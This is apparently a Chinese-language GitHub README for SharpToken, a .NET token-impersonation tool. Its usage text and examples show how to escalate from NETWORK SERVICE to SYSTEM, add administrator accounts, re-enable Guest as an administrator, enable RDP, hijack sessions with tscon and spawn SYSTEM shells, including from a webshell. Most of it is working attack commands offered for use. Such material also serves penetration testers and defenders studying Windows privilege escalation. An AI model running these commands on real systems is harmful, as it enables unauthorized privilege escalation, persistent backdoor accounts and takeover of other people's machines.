# SharpToken


.NET版本的incognito

![image](https://user-images.githubusercontent.com/43266206/188081018-8717b066-1143-48b8-b62b-31360316cce1.png)


## Usage

```
SharpToken By BeichenDream
=========================================================

Github : https://github.com/BeichenDream/SharpToken

If you are an NT AUTHORITY\NETWORK SERVICE user then you just need to add the bypass parameter to become an NT AUTHORIT\YSYSTEM
e.g.
SharpToken execute "NT AUTHORITY\SYSTEM" "cmd /c whoami" bypass


Usage:

SharpToken COMMAND arguments



COMMANDS:

        list_token [process pid]        [bypass]

        list_all_token [process pid] [bypass]

        add_user    <username> <password> [group] [domain] [bypass]

        enableUser <username> <NewPassword> [NewGroup] [bypass]

        delete_user <username> [domain] [bypass]

        execute <tokenUser> <commandLine> [Interactive] [bypass]

        enableRDP [bypass]

        tscon <targetSessionId> [sourceSessionId] [bypass]


example:
    SharpToken list_token
    SharpToken list_token bypass
    SharpToken list_token 6543
    SharpToken add_user admin Abcd1234! Administrators
    SharpToken enableUser Guest Abcd1234! Administrators
    SharpToken delete_user admin
    SharpToken execute "NT AUTHORITY\SYSTEM" "cmd /c whoami"
    SharpToken execute "NT AUTHORITY\SYSTEM" "cmd /c whoami" bypass
    SharpToken execute "NT AUTHORITY\SYSTEM" cmd true
    SharpToken execute "NT AUTHORITY\SYSTEM" cmd true bypass
    SharpToken tscon 1




```

## 枚举Token

枚举的信息包括SID,LogonDomain,UserName,Session,LogonType,TokenType,TokenHandle(Duplicate后的Token句柄),TargetProcessId(Token来源的进程),TargetProcessToken(Token在源进程的句柄)，Groups(Token用户所在组)

```
SharpToken list_token
```

![image](https://user-images.githubusercontent.com/43266206/176751244-dd8f8899-59ec-48e5-9bee-464c0e146573.png)

## 从指定进程枚举Token

```
SharpToken list_token 468
```

![image](https://user-images.githubusercontent.com/43266206/176753494-3c6df1cb-5d14-4b36-aa61-ca68a8c38009.png)



## 获得交互式shell

```
execute "NT AUTHORITY\SYSTEM" cmd true
```

![image](https://user-images.githubusercontent.com/43266206/176751714-c7edb21c-f0be-4794-a14f-be4a7b1fdf61.png)

## 获取命令执行结果(webshell下执行)

```
SharpToken execute "NT AUTHORITY\SYSTEM" "cmd /c whoami"
```

![image](https://user-images.githubusercontent.com/43266206/176751980-dd9413f4-1a4d-4cb0-8ba2-5e0b9ccb2eed.png)

## 引用

https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html

https://github.com/decoder-it/NetworkServiceExploit